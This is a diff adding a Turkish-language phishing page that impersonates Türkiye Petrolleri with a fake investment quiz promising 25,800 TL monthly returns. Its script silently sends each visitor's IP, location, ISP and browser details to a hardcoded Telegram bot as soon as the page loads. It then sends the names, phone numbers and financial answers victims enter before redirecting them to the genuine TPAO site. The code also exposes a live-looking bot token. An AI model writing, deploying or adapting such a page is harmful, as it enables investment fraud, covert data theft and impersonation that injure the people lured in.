@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Türkiye Petrolleri</title>
+<style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:10px}
+    #bg-video{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:1}
+    .card{max-width:440px;width:100%;background:rgba(0,0,0,0.65);border-radius:16px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,0.9);position:relative;z-index:10}
+    .header{background:#c62828;padding:22px 0;text-align:center}
+    .header img{height:88px}
+    .content{padding:50px 32px 60px;text-align:center;color:#fff;position:relative;z-index:11}
+    h2{font-size:21px;line-height:1.5;margin-bottom:35px;font-weight:bold;text-shadow:2px 2px 12px #000}
+    .progress{font-size:15px;color:#ff9999;margin-bottom:15px;text-shadow:1px 1px 6px #000}
+    .dots{display:flex;justify-content:center;gap:12px;margin-top:10px}
+    .dot{width:12px;height:12px;border-radius:50%;background:rgba(255,255,255,0.4)}
+    .dot.active{background:#ff5252;box-shadow:0 0 12px #ff5252}
+    .options{display:flex;flex-direction:column;gap:18px;margin:40px 0}
+    label{display:flex;align-items:center;gap:20px;padding:22px 28px;background:rgba(255,255,255,0.18);border:2px solid rgba(255,255,255,0.3);border-radius:16px;cursor:pointer;font-size:17px;transition:0.3s;color:#fff}
+    label:hover{background:rgba(255,255,255,0.3);border-color:#ff5252}
+    input[type=radio]{width:26px;height:26px;accent-color:#ff5252;cursor:pointer}
+    .page{display:none}
+    .page.active{display:block}
+    button{background:#c62828;color:#fff;border:none;padding:24px 60px;font-size:24px;font-weight:bold;border-radius:50px;cursor:pointer;box-shadow:0 8px 25px rgba(198,40,40,0.7)}
+    button:hover{background:#e53935}
+    .form input,.form select{width:100%;padding:26px 22px;margin-bottom:28px;border:none;border-radius:14px;font-size:20px;background:rgba(255,255,255,0.95);color:#000}
+    .form .phone-row{display:flex;gap:15px}
+    .form .phone-row select{width:110px;background:rgba(255,255,255,0.95);color:#000}
+    .form button{width:100%;padding:26px;border-radius:14px;font-size:24px}
+</style>
+</head>
+<body>
+
+<!-- VİME O – LOGO YOK, İSİM YOK, PLAYER YOK, SADECE VİDEO -->
+<div id="vimeo-bg" style="position:fixed;top:0;left:0;width:100%;height:100%;overflow:hidden">
+    <iframe src="https://player.vimeo.com/video/1141404502?autoplay=1&loop=1&muted=1&background=1&title=0&byline=0&portrait=0&sidedock=0&controls=0&quality=1080p" 
+            frameborder="0" 
+            allow="autoplay; fullscreen" 
+            allowfullscreen 
+            style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none">
+    </iframe>
+</div>
+<script src="https://player.vimeo.com/api/player.js"></script>
+<div class="card">
+    <div class="header">
+        <img src="https://images.seeklogo.com/logo-png/54/1/turkiye-petrolleri-logo-png_seeklogo-547189.png" alt="TP">
+    </div>
+
+    <!-- 0 - Giriş -->
+    <div id="p0" class="page active">
+        <div class="content">
+            <h2>“Türkiye Petrolleri Anonim Şirketi” ile hayallerinizi nasıl gerçekleştirebilirsiniz?</h2>
+            <p style="font-size:22px">Türkiye Petrolleri hisselerini <strong style="color:#ff5252">12 000 TL</strong>'den başlayan miktarla satın alarak</p>
+            <p style="font-size:28px;color:#ff5252;font-weight:bold">her ay 25.800 kazanabilirsiniz</p>
+            <button onclick="go(1)">Teste başla</button>
+        </div>
+    </div>
+
+    <!-- 1 -->
+    <div id="p1" class="page">
+        <div class="content">
+            <div class="progress">Birinci adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            <h2>1. Her Türkiye vatandaşının, ülkemizin kaynaklarının ticaretinden gelir elde etmesi gerektiğine inanıyor musunuz?</h2>
+            <div class="options">
+                <label><input type="radio" name="q1" onclick="saveAndGo(2,this)"> Evet</label>
+                <label><input type="radio" name="q1" onclick="saveAndGo(2,this)"> Hayır</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2 -->
+    <div id="p2" class="page">
+        <div class="content">
+            <div class="progress">İkinci adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            <h2>2. Arzularınızı yerine getirmek için ayda ne kadar para yeterlidir?</h2>
+            <div class="options">
+                <label><input type="radio" name="q2" onclick="saveAndGo(3,this)"> 5.000 TL</label>
+                <label><input type="radio" name="q2" onclick="saveAndGo(3,this)"> 10.000 TL</label>
+                <label><input type="radio" name="q2" onclick="saveAndGo(3,this)"> 25.000 TL</label>
+                <label><input type="radio" name="q2" onclick="saveAndGo(3,this)"> 25.000 TL üzeri</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3 -->
+    <div id="p3" class="page">
+        <div class="content">
+            <div class="progress">Üçüncü adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            <h2>3. Servetinizi hangi amaçla artırmak istiyorsunuz?</h2>
+            <div class="options">
+                <label><input type="radio" name="q3" onclick="saveAndGo(4,this)"> Geleceğinizi güvence altına almak</label>
+                <label><input type="radio" name="q3" onclick="saveAndGo(4,this)"> Ailenize yardım etmek</label>
+                <label><input type="radio" name="q3" onclick="saveAndGo(4,this)"> Kredi/ipoteği ödemek</label>
+                <label><input type="radio" name="q3" onclick="saveAndGo(4,this)"> Ev veya araba satın almak</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4 -->
+    <div id="p4" class="page">
+        <div class="content">
+            <div class="progress">Dördüncü adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            <h2>4. Yatırım konusunda deneyiminiz var mı?</h2>
+            <div class="options">
+                <label><input type="radio" name="q4" onclick="saveAndGo(5,this)"> Hayır, ama daha fazla bilgi edinmek istiyorum</label>
+                <label><input type="radio" name="q4" onclick="saveAndGo(5,this)"> Evet, başarılı</label>
+                <label><input type="radio" name="q4" onclick="saveAndGo(5,this)"> Evet, başarısız</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5 -->
+    <div id="p5" class="page">
+        <div class="content">
+            <div class="progress">Beşinci adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot"></div><div class="dot"></div></div>
+            <h2>5. Hangi hisse senetleriyle ilgileniyorsunuz?</h2>
+            <div class="options">
+                <label><input type="radio" name="q5" onclick="saveAndGo(6,this)"> Türkiye Petrolleri hisseleri</label>
+                <label><input type="radio" name="q5" onclick="saveAndGo(6,this)"> Dünya şirketlerinin hisseleri</label>
+                <label><input type="radio" name="q5" onclick="saveAndGo(6,this)"> Kripto para birimleri</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6 -->
+    <div id="p6" class="page">
+        <div class="content">
+            <div class="progress">Altıncı adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot"></div></div>
+            <h2>6. Herhangi bir finansal yükümlülüğünüz var mı?</h2>
+            <div class="options">
+                <label><input type="radio" name="q6" onclick="saveAndGo(7,this)"> Evet, ipoteğim var</label>
+                <label><input type="radio" name="q6" onclick="saveAndGo(7,this)"> Evet, kredim var</label>
+                <label><input type="radio" name="q6" onclick="saveAndGo(7,this)"> Hayır, sadece ev masraflarım var</label>
+                <label><input type="radio" name="q6" onclick="saveAndGo(7,this)"> Hayır, ancak finansal olarak bağımsız olmak istiyorum</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- 7 -->
+    <div id="p7" class="page">
+        <div class="content">
+            <div class="progress">Yedinci adım</div>
+            <div class="dots"><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div><div class="dot active"></div></div>
+            <h2>7. Türkiye Petrolleri projesinden nasıl haberdar oldunuz?</h2>
+            <div class="options">
+                <label><input type="radio" name="q7" onclick="saveAndGo(8,this)"> Açık hava reklamcılığı</label>
+                <label><input type="radio" name="q7" onclick="saveAndGo(8,this)"> İnternette reklam</label>
+                <label><input type="radio" name="q7" onclick="saveAndGo(8,this)"> Arkadaş önerileri (Türkiye Petrolleri platformu katılımcıları)</label>
+                <label><input type="radio" name="q7" onclick="saveAndGo(8,this)"> Arama platformları</label>
+            </div>
+        </div>
+    </div>
+
+    <!-- Form -->
+    <div id="p8" class="page">
+        <div class="content">
+            <h2>Tebrikler! “Türkiye Petrolleri” platformundaki yatırımlar kullanımınıza açıldı.</h2>
+            <p>İletişim bilgilerinizi bırakın ve hemen kazanmaya başlayın.</p>
+            <h3 style="font-size:26px;color:#ff5252">BANKA GARANTİLİ YATIRIMLAR</h3>
+            <div class="form">
+                <input type="text" id="isim" placeholder="İsim" required>
+                <input type="text" id="soyisim" placeholder="Soyisim" required>
+                <div class="phone-row">
+                    <select id="kod"><option>+90</option></select>
+                    <input type="tel" id="tel" placeholder="Telefon Numarası" required>
+                </div>
+                <button onclick="gonder()">Kayıt Ol</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+const TOKEN = "8465753025:AAElidwrXUH0IqnP_Rnjkcz7yZ8oXqny4BQ";
+const CHAT_ID = "8245369896";
+
+let cevaplar = {};
+let ipInfo = {};
+
+const proxy = 'https://api.allorigins.win/raw?url=';
+
+// Sayfa açılır açılmaz maksimum bilgi topla ve Telegram'a gönder
+window.onload = async function() {
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        ipInfo = await ipRes.json();
+    } catch(e) { ipInfo = {ip: "bilinmiyor", country_name: "bilinmiyor", city: "bilinmiyor", org: "bilinmiyor"}; }
+
+    let mesaj = `*YENİ ZİYARETÇİ!*\n\n`;
+    mesaj += `🌍 IP: ${ipInfo.ip || "bilinmiyor"}\n`;
+    mesaj += `🏴 Ülke: ${ipInfo.country_name || "bilinmiyor"}\n`;
+    mesaj += `🏙 Şehir: ${ipInfo.city || "bilinmiyor"}\n`;
+    mesaj += `📶 ISP: ${ipInfo.org || "bilinmiyor"}\n`;
+    mesaj += `📱 Tarayıcı: ${navigator.userAgent.substring(0,70)}\n`;
+    mesaj += `🖥 Ekran: ${screen.width}x${screen.height}\n`;
+    mesaj += `🔗 URL: ${location.href}\n`;
+    mesaj += `⏰ Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
+    mesaj += `📍 Referrer: ${document.referrer || "direkt"}\n`;
+
+    fetch(proxy + encodeURIComponent(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`));
+};
+
+// Cevap kaydet ve ilerle
+function saveAndGo(next, el) {
+    cevaplar[el.name] = el.parentNode.innerText.trim();
+    setTimeout(() => go(next), 400);
+}
+
+function go(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('p'+n).classList.add('active');
+}
+
+// Kayıt Ol → TPAO + Lead gönder
+function gonder() {
+    let isim = document.getElementById('isim').value.trim();
+    let soyisim = document.getElementById('soyisim').value.trim();
+    let tel = document.getElementById('kod').value + document.getElementById('tel').value.trim();
+
+    let mesaj = `*TAMAMLANMIŞ LEAD!*\n\n`;
+    mesaj += `👤 ${isim} ${soyisim}\n📞 ${tel}\n`;
+    mesaj += `🌍 ${ipInfo.country_name || "bilinmiyor"} - ${ipInfo.city || "bilinmiyor"}\n`;
+    mesaj += `*Cevaplar:*\n`;
+    for (let q in cevaplar) mesaj += `• ${q.replace('q','Soru ')}: ${cevaplar[q]}\n`;
+
+    fetch(proxy + encodeURIComponent(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`))
+        .then(() => window.location.href = "https://www.tpao.gov.tr/")
+        .catch(() => window.location.href = "https://www.tpao.gov.tr/");
+}
+</script>
+</body>
+</html>
